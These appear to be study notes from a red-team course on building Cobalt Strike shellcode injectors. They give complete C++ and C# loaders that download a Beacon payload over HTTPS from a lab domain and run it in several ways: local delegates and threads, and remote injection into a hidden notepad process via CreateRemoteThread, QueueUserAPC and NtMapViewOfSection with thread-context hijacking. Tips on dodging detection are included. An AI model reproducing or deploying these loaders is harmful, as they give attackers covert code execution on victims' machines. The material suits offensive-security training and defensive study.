Writing process injectors using Cobalt Strike shellcode, generate shellcode via *Payloads > Windows Stageless Payload* and setting the output to *raw*

This window alsp let's us select what kind of exit function we want: ExitProcess or ExitThread

If you do _Payloads > Windows Stageless Generate All Payloads_ then both variants will be produced with the filenames xprocess and xthread

Host the xprocess shellcode on the CS team server via _Site Management > Host File_

Ensure there are appropriate htaccess rules to allow the shellcode to be downloaded through the redirector

## Downloading Files in C++

WinHTTP is a windows library to access the HTTP protocol. Best practice is to download shellcode at runtime to get around the inflexibility to change shellcode and reduce detection.

Example start to calling winhttp:
```
#include <Windows.h>
#include <winhttp.h>
#include <iostream>
#include <vector>

#pragma comment(lib, "winhttp.lib")

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);
```

The pragma line tells the linker to look for the specified library during compilation. We also declare a download function that will take a URL and filename, and return a BYTE vector. 

Full code to make a GET request for shellcode at a target:

```
#include <Windows.h>
#include <winhttp.h>
#include <iostream>
#include <vector>

#pragma comment(lib, "winhttp.lib")

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);

int main()
{
    std::vector<BYTE> shellcode = Download(L"www.infinity-bank.com\0", L"/shellcode.bin\0");
}

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {

    // initialise session
    HINTERNET hSession = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        WINHTTP_FLAG_SECURE_DEFAULTS);          // enable ssl

    // create session for target
    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseAddress,
        INTERNET_DEFAULT_HTTPS_PORT,            // port 443
        0);

    // create request handle
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);                   // ssl

    // send the request
    WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0);

    // receive response
    WinHttpReceiveResponse(
        hRequest,
        NULL);

    // read the data
    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {

        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }

    } while (bytesRead > 0);

    // close all the handles
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}
}
```

## Downloading Files in CSharp

Because C# is a high-level language, it has many abstractions that make this easier, using the HttpClient we can make the same request with way less code:

```
public static async Task Main(string[] args)
{
    byte[] shellcode;

    using (var client = new HttpClient())
    {
        client.BaseAddress = new Uri("https://www.infinity-bank.com");
        shellcode = await client.GetByteArrayAsync("/shellcode.bin");
    }
}
```

*NOTE* The using keyword ensures that all the resources associated with the client are disposed after use

## Function Delegate C++

Now in our C++ code we have the shellcode and now we want to execute it inside the current process. Dynamic memory allocations such as vectors are stored in heap memory. We can allocate a new region of memory and copy the shellcode into it, but we could just leave it and execute directly from the heap.

Heap memory is RW by default, we can make a small region of the heap memory RWX using VirtualProtect API. Steps needed:

- obtain a raw pointer to the shellcode
- pass to VirtualProtect, specifying a size and the new memory protection
- Execute shellcode

```
int main()
{
    std::vector<BYTE> shellcode = Download(L"www.infinity-bank.com\0", L"/shellcode.bin\0");

    // get pointer to buffer
    LPVOID ptr = &shellcode[0];

    // set memory to RWX
    DWORD oldProtect;
    VirtualProtect(
        ptr,
        shellcode.size(),
        PAGE_EXECUTE_READWRITE,
        &oldProtect);

    // execute
    (*(void(*)()) ptr)();
}
```

## Function Delegate CSharp

As with C++ in C# shellcode can be executed one it's sitting in a local buffer. First modify the project settings to prefer 64-bit and allow unsafe code.

C# as a managed code shouldn't allow direct access to memory via pointers, changing these settings allows us to bypass the CLR and garbage collectors. With that though it's important to note that it isn't any different than usual manual memory management of C++.

The fixed keyword can be used to access a pointer to the memory of an underlying variable, and will prevent the garbage collector from moving or reallocating the data.

```
unsafe{
fixed (byte* ptr = shellcode)
{}
}
```

You can also mark methods as unsafe:

```
[DLLImport("kernel32.dll")]
static extern unsafe bool VirtualProtect(
byte* lpAddress,
uint dwSize,
MEMORY_PROTECTION flNewProtect,
out MEMORY_PROTECTION lpflOldProtect);

enum MEMORY_PROTECTION : uint
{
PAGE_EXECUTE_READ = 0x20,
PAGE_EXECUTE_READWRITE = 0x40,
PAGE_READWRITE = 0x04
}
```

This allows us to mark the heap memory as RWX inside the unsafe code block:
```
unsafe{
fixed (byte* ptr = shellcode)
{
VirtualProtect(ptr,
(uint)shellcode.length,
MEMORY_PROTECTION.PAGE_EXECUTE_READWRITE,
out _)
}
}
```

To execute the shellcode we need to marshal a pointer to a function delegate:

```
[UnmagagedFunctionPointer(CallingConvention.StdCall)]
delegate void Beacon();
```

Then call GetDelegateForFunctionPointer which will return the delegate as a local variable. That variable can be executed like a method:

```
var beacon = Marshal.GetDelegateForFunctionPointer<Beacon>((IntPtr)ptr);
beacon()
```

Complete Code:

```
using System;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace LocalInjector
{
    internal class Program
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void Beacon();

        [DllImport("kernel32.dll")]
        static extern unsafe bool VirtualProtect(
            byte* lpAddress,
            uint dwSize,
            MEMORY_PROTECTION flNewProtect,
            out MEMORY_PROTECTION lpflOldProtect);

        enum MEMORY_PROTECTION : uint
        {
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_READWRITE = 0x04
        }

        static async Task Main(string[] args)
        {
            byte[] shellcode;
            using (var client = new HttpClient())
            {
                client.BaseAddress = new Uri("https://www.infinity-bank.com");
                shellcode = await client.GetByteArrayAsync("/shellcode.bin");
            }

            unsafe
            {
                fixed (byte* ptr = shellcode)
                {
                    VirtualProtect(
                        ptr,
                        (uint)shellcode.Length,
                        MEMORY_PROTECTION.PAGE_EXECUTE_READWRITE,
                        out _);

                    var beacon = Marshal.GetDelegateForFunctionPointer<Beacon>((IntPtr)ptr);
                    beacon();
                }
            }
        }
    }
}
```

## CreateThread C++

Executing shellcode in the local process as a function delegate does so on the main thread of the application.  This is fine if your injector does not need to carry out any other tasks, but you may wish to free up execution flow and run the shellcode in the background instead.

This can be done by executing the shellcode in a separate thread.  C++ can use the [CreateThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread) API - it only requires the pointer to the shellcode cast as `LPTHREAD_START_ROUTINE`.

```
//execute
DWORD threadId =0;
HANDLE hThread = CreateThread(
NULL,
0,
(LPTHREAD_START_ROUTINE)ptr,
NULL,
0,
&threadId);

//close handle
CloseHandle(hThread);
```

This will run in background and will continue while the program continues until exit. If the program closes so do all background threads, including the shellcode. We don't want this to happen so we write code to stop the program from closing:
```
//stop the program from closing
std::cout << "Shellcode is running, press key to exit" << std::endl;
_getch();
```

Full code:

```
std::vector<BYTE> shellcode = Download(L"www.infinity-bank.com\0", L"/shellcode.bin\0");

// get pointer to buffer
LPVOID ptr = &shellcode[0];

// set memory to RWX
DWORD oldProtect = 0;
VirtualProtect(
    ptr,
    shellcode.size(),
    PAGE_EXECUTE_READWRITE,
    &oldProtect);

// execute
DWORD threadId = 0;
HANDLE hThread = CreateThread(
    NULL,
    0,
    (LPTHREAD_START_ROUTINE)ptr,
    NULL,
    0,
    &threadId);

// close handle
CloseHandle(hThread);

// stop the program from closing
std::cout << "Shellcode is running, press key to exit" << std::endl;
_getch();
```

## CreateThread CSharp

C# has a managed abstraction over threads which allows you to create new threads using `new Thread()` To give a thread work, pass a `ThreadStart` or `ParameterizedThreadStart` delegate into its constructor. A ThreadStart delegate is one that returns void and has no input parameters, aka: `delegate void ThreadStart()` which matches our beacon delegate perfectly.

```
var beacon = Marshal.GetDelegateForFunctionPointer<Beacon>((IntPtr)ptr);

var thread = new Thread(new ThreadStart(beacon));
thread.Start();

Console.WriteLine("Shellcode is running, press key to exit");
Console.ReadKey();
```

## CreateRemoteThread

The CreateRemoteThread API behaves the same way as CreateThread but allows you to start a thread in a process other than your own. Use this to inject shellcode into a different process and requires the use of more Windows APIs to perform. Rather than injecting into existing processes, we're going to re-use our CreateProcessW code to spawn our own. 

This code is very similar to the above examples, but it includes the dwFlags on the STARTUPINFO struct and the CREATE_NO_WINDOW flag on CreateProcess. These allow the process to spawn without a visible window. 

```
//create startup info struct
LPSTARTUPINFOW startup_info = new STARTUPINFOW();
startup_info->cb = sizeof(STARTUPINFOW);
startup_info->dwFlags = STARTF_USESHOWWINDOW;

//create process info struct
PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();

//null terminated command line
wchar_t cmd[] = L"notepad.exe\0";

//create process
CreateProcess(
NULL,
cmd,
NULL,
NULL,
FALSE,
CREATE_NO_WINDOW,
NULL,
NULL,
startup_info,
process_info);

//download shellcode
std::vector<BYTE> shellcode = Download(L"www.infinity-bank.com\0", L"/shellcode.bin\0");
```

Now allocate a region of memory inside the target process using VirtualAllocEx large enough to hold the shellcode, this returns the base address of the allocated memory:

```
//allocate memory
LPVOID ptr = VirtualAllocEx(
process_info->hProcess,
NULL,
shellocde.size(),
MEM_COMMIT,
PAGE_EXECUTE_READWRITE);
```

Now use WriteProcessMemory to write the shellcode to the memory:

```
//copy shellcode
SIZE_T bytesWritten = 0;
WriteProcessMemory(
process_info->hProcess,
ptr,
&shellcode[0],
shellcode.size(),
&bytesWritten);
```

Finally call CreateRemoteThread to execute the shellcode and close all the handles:
```
//create remote thread
DWORD threadId = 0;
HANDLE hThread = CreateRemoteThread(
process_info->hProcess,
NULL,
0,
(LPTHREAD_START_ROUTINE)ptr,
NULL,
0,
&threadId);

//close handles
CloseHandle(hThread);
CloseHandle(process_info->hThread);
CloseHandle(process_info->hProcess);
```

*NOTE* The downside to this API is that it creates a thread whose start address is not backed by a module on disk

Full Code:

```
// create startup info struct
LPSTARTUPINFOW startup_info = new STARTUPINFOW();
startup_info->cb = sizeof(STARTUPINFOW);
startup_info->dwFlags = STARTF_USESHOWWINDOW;

// create process info struct
PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();

// null terminated command line
wchar_t cmd[] = L"notepad.exe\0";

// create process
CreateProcess(
    NULL,
    cmd,
    NULL,
    NULL,
    FALSE,
    CREATE_NO_WINDOW,
    NULL,
    NULL,
    startup_info,
    process_info);

// download shellcode
std::vector<BYTE> shellcode = Download(L"www.infinity-bank.com\0", L"/shellcode.bin\0");

// allocate memory
LPVOID ptr = VirtualAllocEx(
    process_info->hProcess,
    NULL,
    shellcode.size(),
    MEM_COMMIT,
    PAGE_EXECUTE_READWRITE);

// copy shellcode
SIZE_T bytesWritten = 0;
WriteProcessMemory(
    process_info->hProcess,
    ptr,
    &shellcode[0],
    shellcode.size(),
    &bytesWritten);

// create remote thread
DWORD threadId = 0;
HANDLE hThread = CreateRemoteThread(
    process_info->hProcess,
    NULL,
    0,
    (LPTHREAD_START_ROUTINE)ptr,
    NULL,
    0,
    &threadId);

// close handles
CloseHandle(hThread);
CloseHandle(process_info->hThread);
CloseHandle(process_info->hProcess);
```

## QueueUserAPC

The QueueUserAPC API provides a convenient means of executing shellcode on the main thread of a spawned process. This time, we'll spawn notepad.exe  in a suspended state, inject the shellcode and then queue a call to the shellcode on its primary thread.

```
//create startup info struct
LPSTARTUPINFOW startup_info = new STARTUPINFOW();
startup_info->cb = sizeof(STARTUPINFOW);
startup_info->dwFlags = STARTF_USESHOWWINDOW;

//create process info struct
PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();

//null terminated command line
wchar_t cmd[] = L"notepad.exe\0"

//create process
CreateProcess(
NULL,
cmd,
NULL,
NULL,
FALSE,
CREATE_NO_WINDOW | CREATE_SUSPENDED,
NULL,
NULL,
startup_info,
process_info);
```

The process of downloading the shellcode and writing it to the target process can be exactly the same. Instead of CreateRemoteThread call QueueUserAPC and then resume the process:

```
//queue apc
QueueUserAPC(
(PAPCFUNC)ptr,
process_info.hThread,
0);

//resume process
ResumeThread(process_info.hThread);
```

Full Code:

```
// create startup info struct
LPSTARTUPINFOW startup_info = new STARTUPINFOW();
startup_info->cb = sizeof(STARTUPINFOW);
startup_info->dwFlags = STARTF_USESHOWWINDOW;

// create process info struct
PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();

// null terminated command line
wchar_t cmd[] = L"notepad.exe\0";

// create process
CreateProcess(
    NULL,
    cmd,
    NULL,
    NULL,
    FALSE,
    CREATE_NO_WINDOW | CREATE_SUSPENDED,
    NULL,
    NULL,
    startup_info,
    process_info);

// download shellcode
std::vector<BYTE> shellcode = Download(L"www.infinity-bank.com\0", L"/shellcode.bin\0");

// allocate memory
LPVOID ptr = VirtualAllocEx(
    process_info->hProcess,
    NULL,
    shellcode.size(),
    MEM_COMMIT,
    PAGE_EXECUTE_READWRITE);

// copy shellcode
SIZE_T bytesWritten = 0;
WriteProcessMemory(
    process_info->hProcess,
    ptr,
    &shellcode[0],
    shellcode.size(),
    &bytesWritten);

// queue apc
QueueUserAPC(
    (PAPCFUNC)ptr,
    process_info->hThread,
    0);

// resumme process
ResumeThread(process_info->hThread);

// close handles
CloseHandle(process_info->hThread);
CloseHandle(process_info->hProcess);
```

## NtMapViewOfSection

Nt section of APIs are synonymous with the process hollowing technique. Works by starting a process in a suspended state, unmapping the PE content from memory and then mapping anew PE in its place. "Proper" process hollowing is mapping each data section, import table, and relocations appropriately. This will be covered in the CS reflective loader, for now an example with NtCreateSection and NtMapViewOfSection can be used as alternatives for VirtualAllocEx and WiretProcessMemory. 

Only a limited number of Nt APIs are officially exposed and most of them via Windows driver header files. The Nt APIs are also largely undocumented. To use them in a user-application, we need to define them in our own header file. A lot of work has been put in to reversing and documenting these APIs and structs here are the resources: https://undocumented.ntinternals.click/, https://www.geoffchappell.com/, https://github.com/winsiderss/phnt.

Create a new header file in your project and add the following:

```
#pragma once

using NtCreateSection = NTSTATUS(NTAPI*)(
OUT PHANDLE SectionHandle,
IN ULONG DesiredAccess,
IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
IN OPTIONAL PLARGE_INTEGER MaximumSize,
IN ULONG PageAttributes,
IN ULONG SectionAttributes,
IN OPTIONAL HANDLE FileHandle);

using NtMapViewOfSection = NTSTATUS(NTAPI*)(
IN HANDLE SectionHandle,
IN HANDLE ProcessHandle,
IN OUT PVOID* BaseAddress,
IN ULONG_PTR ZeroBits,
IN SIZE_T CommitSize,
IN OUT OPTIONAL PLARGE_INTEGER SectionOffset,
IN OUT PSIZE_T ViewSize,
IN DWORD InheritDisposition,
IN ULONG AllocationType,
IN ULONG Win32Protect);

using NtUnmapViewOfSection = NTSTATUS(NTAPI*)(
IN HANDLE ProcessHandle,
IN PVOID BaseAddress OPTIONAL);

typedef enum _SECTION_INHERIT : DWORD {
ViewShare = 1,
ViewUnmap = 2
} SECTION_INHERIT, *PSECTION_INHERIT;
```

Then back in the main .cpp file add `#include "Native.h"` Native.h is the name of the header file you create above, change accordingly. 

Before these APIs can be used, we need to get the address of the exported functions in ntdll.dll. Get a handle to ntdll.dll with `GetModuleHandle` and then the address of NtCreateSection with `GetProcAddress`

```
//find NtCreateSection
HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
FARPROC hNtCreateSection = GetProcAddress(hNtdll, "NtCreateSection");
```

This can be cast to the NtCreateSection definition, which is the variable used to call it like a method. You may also find it more convenient to cast GetProcAddress directly. 

```
//find NtCreateSection
HMODULE = hNtdll = GetModuleHandle(L"ntdll.dll");
NtCreateSection ntCreateSection = (NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");

ntCreateSection()
```

Do the same for NtMapViewOfSection and NtUnmapViewOfSection. 
```
// find Nt APIs
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    NtCreateSection ntCreateSection = (NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    NtMapViewOfSection ntMapViewOfSection = (NtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtUnmapViewOfSection ntUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
```

Next call NtCreateSeciton to create a new section in the current process. A section object is a region of memory that can be shared with other processes. The section needs to be large enough to accommodate the shellcode:

```
//create section in local process
HANDLE hSection;
LARGE_INTEGER szSection = { shellocde.size()};

NTSTATUS status = ntCreateSection(
&hSection,
SECTION_ALL_ACCESS,
NULL,
&szSection,
PAGE_EXECUTE_READWRITE,
SEC_COMMIT,
NULL);
```

NTSTATUS error codes can be found [here](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55) any result that is not zero is effectively a failure. The NT_SUCCESS macro can be used as an easy way to catch errors and print the status.

```
if (!NT_SUCCESS(status)) {
printf("NtCreateSection failed: 0x%X\n", status);
}
```

After this call a new section handle will be visible in Process Hacker.

To write data to it, this section first needs to be shared or mapped to our own process with NtMapViewOfSection. It takes the section handle, process handle and will provide a pointer to the allocated memory. 

```
//map section into memory of local process
PVOID hLocalAddress = NULL;
SIZE_T viewSize = 0;

status = ntMapViewOfSection(
hSection,
GetCurrentProcess(),
&hLocalAddress,
NULL,
NULL,
NULL,
&viewSize,
ViewShare,
NULL,
PAGE_EXECUTE_READWRITE);
```

Copy that shellcode into the region:
```
//copy shellcode into local memory
RtlCopyMemory(hLocalAddress, &shellcode[0], shellocde.size());
```

Next, map the section into the target process. This will automatically propagate the shellcode from the local process.

```
//map section into memory of remote process
PVOID hRemoteAddress = NULL;

status = ntMapViewOfSection(
hSection,
process_info->hProcess,
&hRemoteAddress,
NULL,
NULL,
NULL,
&viewSize,
ViewShare,
NULL,
PAGE_EXECUTE_READWRITE);
```

Since this process was spawned in a suspended state, the shellcode could be executed using QueueUserAPC. This method would also be possible with a process that was already running, or one that wasn't spawned suspended - in which case we could use something like CreateRemoteThread. To show off another method we'll use GetThreadContext and SetThreadContext to hijack the primary thread of the process and point its execution somewhere else. 

The first step is to get the current context of the thread by initializing a new CONTEXT structure and calling GetThreadContext.

```
//get context of main thread
LPCONTEXT pContext = new CONTEXT();
pContext->ContextFlags = CONTEXT_INTEGER;
GetThreadContext(process_info->hThread, pContext);
```

The desired ContextFlags should be set first, which indicates what context information you want back. These aren't particularly well documented, but there are some comments in winnt header file. We're going to update the RCX register context, which means the context flags can be CONTEXT_INTEGER. You could also use CONTEXT_ALL in a pinch: [resource](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-arm64_nt_context)

Set the RCX register context to the memory location of the shellcode, call SetThreadContext and then resume the thread. 

```
//update rcx context
pContext->Rcx = (DWORD64)hRemoteAddress;
SetThreadContext(process_info->hThread, pContext);

//resume thread
ResumeThread(process_info->hThread);
```

Now we don't need the local process mapped region, so release it:
```
//unmap memory from local process
status = ntunmapViewOfSection(
GetCurrentProcess(),
hLocalAddress
);
```

Full code:
```
#include <Windows.h>
#include <winternl.h>
#include <winhttp.h>
#include <iostream>
#include <vector>
#include "Native.h"

#pragma comment(lib, "winhttp.lib")

int main()
{
    // create startup info struct
    LPSTARTUPINFOW startup_info = new STARTUPINFOW();
    startup_info->cb = sizeof(STARTUPINFOW);
    startup_info->dwFlags = STARTF_USESHOWWINDOW;

    // create process info struct
    PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();

    // null terminated command line
    wchar_t cmd[] = L"notepad.exe\0";

    // create process
    BOOL success = CreateProcess(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | CREATE_SUSPENDED,
        NULL,
        NULL,
        startup_info,
        process_info);

    // download shellcode
    std::vector<BYTE> shellcode = Download(L"www.infinity-bank.com\0", L"/shellcode.bin\0");

    // find Nt APIs
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    NtCreateSection ntCreateSection = (NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    NtMapViewOfSection ntMapViewOfSection = (NtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtUnmapViewOfSection ntUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    // create section in local process
    HANDLE hSection;
    LARGE_INTEGER szSection = { shellcode.size() };

    NTSTATUS status = ntCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        &szSection,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        NULL);

    // map section into memory of local process
    PVOID hLocalAddress = NULL;
    SIZE_T viewSize = 0;

    status = ntMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &hLocalAddress,
        NULL,
        NULL,
        NULL,
        &viewSize,
        ViewShare,
        NULL,
        PAGE_EXECUTE_READWRITE);

    // copy shellcode into local memory
    RtlCopyMemory(hLocalAddress, &shellcode[0], shellcode.size());

    // map section into memory of remote process
    PVOID hRemoteAddress = NULL;

    status = ntMapViewOfSection(
        hSection,
        process_info->hProcess,
        &hRemoteAddress,
        NULL,
        NULL,
        NULL,
        &viewSize,
        ViewShare,
        NULL,
        PAGE_EXECUTE_READWRITE);

    // get context of main thread
    LPCONTEXT pContext = new CONTEXT();
    pContext->ContextFlags = CONTEXT_INTEGER;
    GetThreadContext(process_info->hThread, pContext);

    // update rcx context
    pContext->Rcx = (DWORD64)hRemoteAddress;
    SetThreadContext(process_info->hThread, pContext);

    // resume thread
    ResumeThread(process_info->hThread);

    // unmap memory from local process
    status = ntUnmapViewOfSection(
        GetCurrentProcess(),
        hLocalAddress);
}
```